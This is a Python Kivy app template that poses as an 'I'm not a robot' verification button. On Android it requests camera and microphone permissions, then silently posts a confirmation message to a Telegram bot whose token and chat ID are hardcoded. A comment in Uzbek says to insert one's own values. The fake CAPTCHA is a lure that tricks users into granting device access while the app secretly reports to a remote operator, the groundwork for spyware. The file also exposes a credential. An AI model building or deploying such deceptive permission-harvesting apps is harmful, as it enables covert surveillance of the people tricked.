from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.utils import platform
import requests
import threading

# O'ZINGIZNIKINI YOZING
TOKEN = '8747551056:AAHnqN9xWXnqlYC_WWUT7vDDEe031v_fmzc'
CHAT_ID = '7712228311'

class VerifierApp(App):
    def build(self):
        layout = BoxLayout()
        self.btn = Button(text="I'm not a robot", background_color=(0, 0.5, 1, 1))
        self.btn.bind(on_release=self.check)
        layout.add_widget(self.btn)
        return layout

    def check(self, instance):
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            request_permissions([Permission.CAMERA, Permission.RECORD_AUDIO], self.done)
        else:
            self.done(None, [True])

    def done(self, permissions, results):
        if all(results):
            threading.Thread(target=self.send).start()
            self.btn.text = "Verified ✅"

    def send(self):
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": "✅ Ruxsat berildi!"})

if __name__ == '__main__':
    VerifierApp().run()